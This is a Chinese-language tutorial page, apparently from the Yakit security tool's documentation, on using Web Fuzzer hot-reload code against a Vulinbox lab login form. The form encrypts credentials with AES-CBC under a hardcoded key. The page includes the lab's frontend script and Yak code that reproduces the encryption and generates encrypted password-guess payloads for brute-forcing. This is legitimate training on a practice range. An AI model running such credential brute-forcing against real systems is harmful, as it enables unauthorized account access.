---
sidebar_position: 20
---

# 热加载场景案例：爆破aes cbc加密
这篇文章我们将会介绍另一个热加载的实际应用案例：爆破aes cbc加密。我们以 yakit 官方的 Vulinbox靶场为例。

首先我们需要安全并启动 Vulinbox 靶场，打开 yakit ，点击**试验性功能 - (靶场)Vulinbox**：

![](/img/products/yakit/Fuzz-hotpatch-example2/1.png)

打开**Vulinbox 管理器**页面后，点击右上角的安装靶场：

![](/img/products/yakit/Fuzz-hotpatch-example2/2.png)

安装成功后，我们关闭**Vulinbox 管理器**页面后重新打开，看到已经提示安装成功的提示，我们点击启动靶场：

![](/img/products/yakit/Fuzz-hotpatch-example2/3.png)

在启动靶场中设置参数，我们默认即可，点击**启动靶场**按钮：

![](/img/products/yakit/Fuzz-hotpatch-example2/4.png)

等待下方页面输出`VULINBOX RUNNING IN：`的提示，说明靶场启动成功：

![](/img/products/yakit/Fuzz-hotpatch-example2/5.png)

接着我们手动访问该URL，打开靶场页面，找到`CryptoJS.AES(CBC) 前端加密登陆表单`：

![](/img/products/yakit/Fuzz-hotpatch-example2/6.png)

靶场页面如下所示：

![](/img/products/yakit/Fuzz-hotpatch-example2/7.png)

首先我们需要了解这个靶场，这个靶场的目的是要对用户和密码进行爆破，直到找到正确的用户名和密码。而用户名和密码是经过json序列化之后AES CBC的方式进行加密的，所以我们需要先对加密的过程进行分析。

为了完成这个靶场，我们需要了解一下AES算法。
> AES（Advanced Encryption Standard，高级加密标准）是一种对称加密算法，也就是说加密和解密使用相同的密钥。这是一种块加密算法，它以固定大小（128位，即16字节）的块来处理数据。
> 
> CBC（Cipher Block Chaining，密码块链）是AES中常用的一种工作模式。在CBC模式中，每个明文块在加密之前，都会与前一个密文块进行XOR（异或）操作，然后再进行加密。对于第一个明文块，因为前面没有密文块，所以会与一个初始化向量（IV）进行XOR操作。

查看源码，我们可以看到加密的过程如下：
```html
<script>
    var iv = CryptoJS.lib.WordArray.random(128/8);
    function generateKey() {
        return  CryptoJS.enc.Utf8.parse("1234123412341234")  // 十六位十六进制数作为密钥
    }
    const key = generateKey()
    // 解密方法
    function Decrypt(word) {
        return  CryptoJS.AES.decrypt(word, key, {iv: iv}).toString(); 
    }
    // 加密方法
    function Encrypt(word) {
        console.info(word);
        return  CryptoJS.AES.encrypt(word, key, {iv: iv}).toString(); 
    }
    function getData() {
        return {
            "username": document.getElementById("username").value,
            "password": document.getElementById("password").value,
        }
    }
    function outputObj(jsonData) {
        const word = JSON.stringify(jsonData);
        return {
            "data": Encrypt(word),
            "key": key.toString(),
            iv: iv.toString(),
        }
    }
    function submitJSON(event) {
        event.preventDefault();
        const url = "/crypto/js/lib/aes/cbc/handler";
        let jsonData = getData();
        let submitResult = JSON.stringify(outputObj(jsonData), null, 2)
        console.log("key", key)
        fetch(url, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: submitResult,
        })
            .then(response => response.text())
            .then(data => {
                console.log("Success:", data);
                document.body.innerHTML = data;
            })
            .catch((error) => {
                console.error("Error:", error);
            });
    }
    document.getElementById("json-form").addEventListener("change", () => {
        let jsonData = {
            "username": document.getElementById("username").value,
            "password": document.getElementById("password").value,
        };
        document.getElementById("encrypt").innerHTML = JSON.stringify(outputObj(jsonData), null, 2)
        document.getElementById("input").innerHTML = JSON.stringify(jsonData, null, 2)
    })
    document.getElementById("json-form").addEventListener("submit", submitJSON)
</script>
```
当我们点击**Submit**按钮时，执行逻辑如下：
1. 调用getData函数获取用户在表单中填写的用户名和密码。
2. 调用outputObj函数，将获取到的数据进行AES CBC加密，并将加密后的数据、密钥和初始化向量（iv）一起封装成一个对象。
3. 将这个对象转换为JSON字符串，准备发送到服务器。
4. 使用fetch API向`/crypto/js/lib/aes/cbc/handler`这个后端接口发送一个POST请求，请求的body就是刚才生成的JSON字符串。

另外我们还需要了解一下iv和key的格式，实际上如果对CryptoJS这个库有了解的师傅应该知道，通过调用`CryptoJS.lib.WordArray.random`(iv的生成方式)和`CryptoJS.enc.Utf8.parse`(key的生成方式)生成的iv和key，通过调用`toString()`方法得到的字符串是经过hex过的。我们也可以通过在浏览器控制台中手动调用`iv.toString()`和`key.toString()`的方式或者查看[CryptoJS官方文档](https://cryptojs.gitbook.io/docs/)来了解。

在这之后我们使用yakit的 MITM 模块拦截真正的登录请求，来查看实际发送的数据，并思考如何使用热加载来实现爆破：
![](/img/products/yakit/Fuzz-hotpatch-example2/8.png)

接下来我们需要用 Yak 代码实现这个AES CBC加密，我们知道iv和key是固定的，所以我们可以先使用`codec.DecodeHex(data)`来把十六进制的字符串还原为原始的byte。
```go
// 这里我们使用了wavy call这个语法，即在调用时添加一个~符号，这个符号可以自动处理这个函数返回值中的错误
// 目前自动处理的行为是，如果这个函数结尾有错误，那么自动中断程序执行，抛出错误提示
// 其相当于自动调用die(err)
key = codec.DecodeHex("31323334313233343132333431323334")~
// 需要将iv改为你抓包到post参数的iv值
iv = codec.DecodeHex("03395d68979ed8632646813f4c0bbdb3")~
```

然后我们手动拼接需要使用的用户名和密码，将其转换为JSON字符串：
```go
username = "qwe"
password = "asd"
m = {"username": username, "password": password}
jsonInput = json.dumps(m)
```

另外，通过查询[CryptoJS官方文档](https://cryptojs.gitbook.io/docs/#block-modes-and-padding)知道，如果使用`CryptoJS.AES.encrypt()`进行加密，默认使用的是AES CBC加密方式，默认采用Pkcs7 padding。

在 Yak 代码中，我们也可以使用`codec.AESCBCEncryptWithPKCS7Padding(key, data, iv)`：
```go
result = codec.AESCBCEncryptWithPKCS7Padding(key, jsonInput, iv)~
base64Result = codec.EncodeBase64(result)
printf("%s", base64Result)
```

最终的代码如下，我们可以将结果输出来查看结果是否正确，需要注意的是，结果可能与抓包页面中post参数的data值不一样，这实际上是因为在 Yak 代码中map是无序的：
```go
key = codec.DecodeHex("31323334313233343132333431323334")~
iv = codec.DecodeHex("03395d68979ed8632646813f4c0bbdb3")~
username = "qwe"
password = "asd"
m = {"username": username, "password": password}
jsonInput = json.dumps(m)
result = codec.AESCBCEncryptWithPKCS7Padding(key, jsonInput, iv)~
base64Result = codec.EncodeBase64(result)
printf("%s", base64Result) // SUfWboJqpPH3p7I56a3Qn2NDJAtW2/Eq3HFSaLYltgHlKCq3AU/Q038zubFGX/3S
```

我们也可以将结果在浏览器控制台中调用`Decrypt("SUfWboJqpPH3p7I56a3Qn2NDJAtW2/Eq3HFSaLYltgHlKCq3AU/Q038zubFGX/3S")`来查看（`Decrypt`函数的返回值是十六进制字符串），发现可以正确解密，证明我们加密成功。

最后一步，我们编写一个真正可用的热加载函数，来对用户名和密码进行爆破，为了方便，我们将用户名固定为`["admin"]`。
```go
handle = func(p) {
    key = codec.DecodeHex("31323334313233343132333431323334")~
    iv = codec.DecodeHex("03395d68979ed8632646813f4c0bbdb3")~
    usernameDict = ["admin"]
    // passwordDict = x"{{x(pass_top25)}}" // 我们可以使用x前缀字符串来通过fuzztag语法获取pass_top25字典中的值
    passwordDict = ["admin", "123456", "admin123", "88888888", "666666"] // 也可以直接使用手写的list
    resultList = []
    for username in usernameDict {
        for password in passwordDict {
            m = {"username": username, "password": password}
            jsonInput = json.dumps(m)
            result = codec.AESCBCEncryptWithPKCS7Padding(key, jsonInput, iv)~
            base64Result = codec.EncodeBase64(result)
            resultList.Append(base64Result)
        }
    }
    return resultList
}
```

将data参数设置为`{{yak(handle)}}`，点击**发送请求**按钮，可以看到我们成功爆破出用户名和密码：
![](/img/products/yakit/Fuzz-hotpatch-example2/9.png)

实际上，靶场每次启动时爆破成功的密码是随机的，所以师傅们在复现时遇到可能会遇到与图中不同的情况。

感谢看到最后的师傅，至此我们已经对 Web Fuzzer 的所有高级(复杂)用法进行了系统性的讲解。
